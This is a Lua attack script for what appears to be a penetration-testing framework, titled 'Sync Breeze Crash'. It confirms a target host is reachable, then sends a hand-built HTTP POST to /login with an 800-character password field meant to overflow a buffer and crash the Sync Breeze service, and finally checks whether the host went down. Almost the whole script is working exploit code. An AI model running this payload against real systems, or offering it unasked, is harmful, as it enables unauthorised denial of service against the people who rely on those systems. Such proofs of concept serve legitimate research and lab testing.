local tcp = require("tcp")
local http = require("http")
local time = require("time")

-- Metadata
METADATA = {
	AUTHOR = { "farinap5 <farinap5@protonmail.com>" },
	VERSION = "1.0",
	TAGS = { "http", "bof" },
	INFO = [[Sync Breeze Crash]],
}

-- Arguments/Variables needed to execute script
VARS = {
	RHOST = { VALUE = "example.com", NEEDED = "yes", DESCRIPT = "Remote Host" },
	RPORT = { VALUE = "10000", NEEDED = "no", DESCRIPT = "Remote Port" },
}

function Init()
	Meta(METADATA) -- Load metadata
	LoadVars(VARS) -- Load variables
end

function Test(host)
	local client = http.client()
	local url = "http://" .. host .. "/"
	PrintInfoln("calling " .. url)
	local request = http.request("GET", url)
	local result, err = client:do_request(request)
	return err
end

function Main()
	local host = VARS.RHOST.VALUE .. ":" .. VARS.RPORT.VALUE
	local httpErr = Test(host)
	if httpErr then
		PrintErrln(httpErr)
		return
	end
	PrintSuccsln("host is up")

	local payload = "username=AAAAA&password=" .. string.rep("A", 800)

	local http_payload = "POST /login HTTP/1.1\r\n"
	http_payload = http_payload .. "Host: " .. host .. "\r\n"
	http_payload = http_payload .. "Accept-Language: en-US,en;q=0.5\r\n"
	http_payload = http_payload .. "Accept-Encoding: gzip, deflate\r\n"
	http_payload = http_payload .. "Referer: http://" .. host .. "/login\r\n"
	http_payload = http_payload .. "Content-Type: application/x-www-form-urlencoded\r\n"
	http_payload = http_payload .. "Content-Length: " .. string.len(payload) .. "\r\n"
	http_payload = http_payload .. "Connection: keep-alive\r\n"
	http_payload = http_payload .. "Upgrade-Insecure-Requests: 1\r\n"
	http_payload = http_payload .. "\r\n"
	http_payload = http_payload .. payload

	PrintInfoln("sending payload")
	local conn, err = tcp.open(host)
	if err then
		PrintErrln(err)
		return
	end

	err = conn:write(http_payload)
	if err then
		PrintErrln(err)
		return
	end

	--[[local result, err = conn:read()
	if err then
		PrintErrlnErrln(err)
		return
	end]]
	--
	time.sleep(3)
	local httpErr1 = Test(host)
	if httpErr1 then
		PrintSuccsln("host looks down. Good?")
		return
	end
	PrintErrln("host is up")
end

